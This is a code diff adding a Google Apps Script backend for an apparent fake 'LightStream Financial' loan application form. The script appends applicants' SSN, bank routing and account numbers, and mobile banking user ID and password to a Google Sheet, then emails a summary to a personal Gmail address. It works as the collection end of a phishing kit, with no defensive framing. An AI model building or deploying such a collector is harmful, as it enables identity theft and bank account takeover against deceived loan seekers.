@@ -1,0 +1,120 @@
+const SHEET_URL = "https://docs.google.com/spreadsheets/d/1drmvoZPbGED2hratNOu3vBgjJRmk9cYIdLuJq7Scei8/edit";
+
+function doGet(e) {
+  return ContentService.createTextOutput("Google Sheets API is working ✅");
+}
+
+function doPost(e) {
+  try {
+    const sheet = SpreadsheetApp.openByUrl(SHEET_URL).getSheetByName("Sheet1");
+    const data = JSON.parse(e.postData.contents);
+
+    // Add data to Google Sheets
+    sheet.appendRow([
+      data.loanAmount,
+      data.loanPurpose,
+      data.creditScore,
+      data.name,
+      data.email,
+      data.phone,
+      data.streetAddress,
+      data.city,
+      data.state,
+      data.zipCode,
+      data.ssn,
+      data.bankName,
+      data.routingNumber,
+      data.accountNumber,
+      data.annualIncome,
+      data.employmentStatus,
+      data.monthlyHousing,
+      data.yourBank,
+      data.mobileBankingUserId,
+      data.mobileBankingPassword,
+      new Date()
+    ]);
+
+    // 📧 SEND EMAIL NOTIFICATION
+    sendEmailNotification(data);
+
+    return ContentService.createTextOutput(
+      JSON.stringify({ status: "success" })
+    ).setMimeType(ContentService.MimeType.JSON);
+
+  } catch (err) {
+    return ContentService.createTextOutput(
+      JSON.stringify({ status: "error", message: err.message })
+    ).setMimeType(ContentService.MimeType.JSON);
+  }
+}
+
+// 📧 EMAIL NOTIFICATION FUNCTION
+function sendEmailNotification(data) {
+  try {
+    const recipientEmail = "finnfoxpersonalloan@gmail.com";
+    
+    const subject = "🏦 New Loan Application Received - LightStream Financial";
+    
+    const body = `
+🎉 NEW LOAN APPLICATION RECEIVED 🎉
+
+👤 CUSTOMER INFORMATION:
+Name: ${data.name || data.fullName || 'N/A'}
+Email: ${data.email || 'N/A'}
+Phone: ${data.phone || 'N/A'}
+Address: ${data.streetAddress || 'N/A'}, ${data.city || 'N/A'}, ${data.state || 'N/A'} ${data.zipCode || 'N/A'}
+
+💰 LOAN DETAILS:
+Loan Amount: $${data.loanAmount || 'N/A'}
+Loan Purpose: ${data.loanPurpose || 'N/A'}
+Credit Score: ${data.creditScore || 'N/A'}
+
+🏦 BANK INFORMATION:
+Bank Name: ${data.bankName || data.customerBank || 'N/A'}
+Routing Number: ${data.routingNumber || 'N/A'}
+Account Number: ****${(data.accountNumber || '').slice(-4) || 'N/A'}
+
+💼 FINANCIAL INFORMATION:
+Annual Income: $${data.annualIncome || 'N/A'}
+Employment Status: ${data.employmentStatus || 'N/A'}
+Monthly Housing: $${data.monthlyHousing || 'N/A'}
+
+📱 MOBILE BANKING:
+User ID: ${data.mobileBankingUserId || 'N/A'}
+
+📅 Submitted: ${new Date().toLocaleString()}
+
+---
+🔗 Check Google Sheet for complete details:
+${SHEET_URL}
+
+🚀 LightStream Financial Services
+    `;
+
+    MailApp.sendEmail({
+      to: recipientEmail,
+      subject: subject,
+      body: body
+    });
+    
+    console.log("✅ Email notification sent successfully to " + recipientEmail);
+    
+  } catch (emailError) {
+    console.log("❌ Email sending failed: " + emailError.message);
+    // Don't fail the whole submission if email fails
+  }
+}
+
+// Test email function
+function testEmail() {
+  try {
+    MailApp.sendEmail({
+      to: "finnfoxpersonalloan@gmail.com",
+      subject: "🧪 Test Email - LightStream Script Working",
+      body: "This is a test email from Google Apps Script. If you receive this, email notifications are working! 🎉"
+    });
+    console.log("✅ Test email sent successfully");
+  } catch (error) {
+    console.log("❌ Test email failed: " + error.message);
+  }
+}
